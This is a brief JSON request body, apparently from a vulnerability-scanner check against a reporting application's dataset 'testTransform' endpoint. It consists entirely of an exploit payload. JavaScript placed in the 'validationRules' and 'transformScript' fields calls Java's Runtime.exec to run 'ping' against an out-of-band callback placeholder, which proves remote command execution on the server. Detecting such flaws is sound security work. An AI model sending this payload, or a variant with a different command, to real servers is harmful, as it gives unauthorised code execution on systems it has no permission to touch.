        { "dynSentence":"{\"apiUrl\":\"http://127.0.0.1:9095/dataSet/testTransform\",\"method\":\"GET\",\"header\":\"{\\\"Content-Type\\\":\\\"application/json;charset=UTF-8\\\"}\",\"body\":\"1\"}","dataSetParamDtoList": [   {     "paramName": "",     "paramDesc": "",    "paramType": "",    "sampleItem": "",    "mandatory": true,    "requiredFlag": 2,   "validationRules":"function dataTransform(){\nvar x=java.lang.Runtime.getRuntime().exec(\"ping {{interactsh-url}}\")\n}"  }],"dataSetTransformDtoList": [  {    "transformType": "js",    "transformScript": "function dataTransform(){\nvar x=java.lang.Runtime.getRuntime().exec(\"ping {{interactsh-url}}\")\n}"  }],"setType": "http"}
